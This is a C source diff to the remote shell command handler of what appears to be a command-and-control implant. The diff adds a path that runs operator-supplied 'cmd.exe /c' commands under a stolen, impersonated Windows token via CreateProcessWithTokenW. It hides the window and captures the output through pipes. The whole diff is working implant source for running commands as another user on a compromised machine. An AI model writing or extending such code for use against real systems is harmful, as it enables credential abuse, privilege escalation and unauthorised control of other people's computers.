@@ -5,6 +5,7 @@
 #include "Package.h"
 #include "Task.h"
 #include "Config.h"
+#include "Identity.h"
 
 #ifdef INCLUDE_CMD_SHELL
 
@@ -33,11 +34,13 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     HANDLE hStdErrRead      = NULL;
     HANDLE hStdErrWrite     = NULL;
     STARTUPINFOA si         = { 0 };
+    STARTUPINFOW siw        = { 0 };
     PROCESS_INFORMATION pi  = { 0 };
     SECURITY_ATTRIBUTES sa  = { 0 };
     DWORD bytesRead         = 0;
     DWORD bytesAvailable    = 0;
     CHAR cmdLine[8192]      = { 0 };
+    WCHAR cmdLineW[8192]    = { 0 };
     CHAR buffer[4096]       = { 0 };
 
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -48,7 +51,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     if ( !CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0) )
     {
         DWORD error = GetLastError();
-        _err("[CMD_SHELL] CreatePipe (stdout) failed: %d", error);
+        _err("\t CreatePipe (stdout) failed: %d", error);
         PackageError(taskUuid, error);
         goto CLEANUP;
     }
@@ -56,7 +59,7 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     if ( !CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0) )
     {
         DWORD error = GetLastError();
-        _err("[CMD_SHELL] CreatePipe (stderr) failed: %d", error);
+        _err("\t CreatePipe (stderr) failed: %d", error);
         PackageError(taskUuid, error);
         goto CLEANUP;
     }
@@ -72,21 +75,57 @@ VOID ShellCmd(PCHAR taskUuid, PPARSER arguments)
     /* Construct command line: cmd.exe /c "user_command" */
     snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c \"%s\"", cmd);
 
-    /* Create the process */
-    if ( !CreateProcessA(
-        NULL,             // Application name
-        cmdLine,          // Command line
-        NULL,             // Process security attributes
-        NULL,             // Thread security attributes
-        TRUE,             // Inherit handles
-        CREATE_NO_WINDOW, // Creation flags
-        NULL,             // Environment
-        NULL,             // Current directory
-        &si,              // Startup info
-        &pi) )            // Process information
+    /* Create the process - use stolen token if available */
+    BOOL processCreated = FALSE;
+    if ( gIdentityToken != NULL )
+    {
+        _dbg("\t Using impersonated token for process creation");
+        
+        /* Convert command line to wide characters for CreateProcessWithTokenW */
+        if (MultiByteToWideChar(CP_ACP, 0, cmdLine, -1, cmdLineW, sizeof(cmdLineW) / sizeof(WCHAR)) == 0)
+        {
+            DWORD error = GetLastError();
+            _err("\t Failed to convert command line to wide char: %d", error);
+            PackageError(taskUuid, error);
+            goto CLEANUP;
+        }
+        
+        /* Setup wide character startup info */
+        siw.cb           = sizeof(STARTUPINFOW);
+        siw.hStdOutput   = hStdOutWrite;
+        siw.hStdError    = hStdErrWrite;
+        siw.dwFlags      |= STARTF_USESTDHANDLES;
+        
+        processCreated = CreateProcessWithTokenW(
+            gIdentityToken,   // Token handle
+            0,                // Logon flags
+            NULL,             // Application name
+            cmdLineW,         // Command line (wide char)
+            CREATE_NO_WINDOW, // Creation flags
+            NULL,             // Environment
+            NULL,             // Current directory
+            &siw,             // Startup info (wide char)
+            &pi);             // Process information
+    }
+    else
+    {
+        processCreated = CreateProcessA(
+            NULL,             // Application name
+            cmdLine,          // Command line
+            NULL,             // Process security attributes
+            NULL,             // Thread security attributes
+            TRUE,             // Inherit handles
+            CREATE_NO_WINDOW, // Creation flags
+            NULL,             // Environment
+            NULL,             // Current directory
+            &si,              // Startup info
+            &pi);             // Process information
+    }
+
+    if ( !processCreated )
     {
         DWORD error = GetLastError();
-        _err("[CMD_SHELL] CreateProcessA failed: %d", error);
+        _err("\t Process creation failed: %d", error);
         PackageError(taskUuid, error);
         goto CLEANUP;
     }
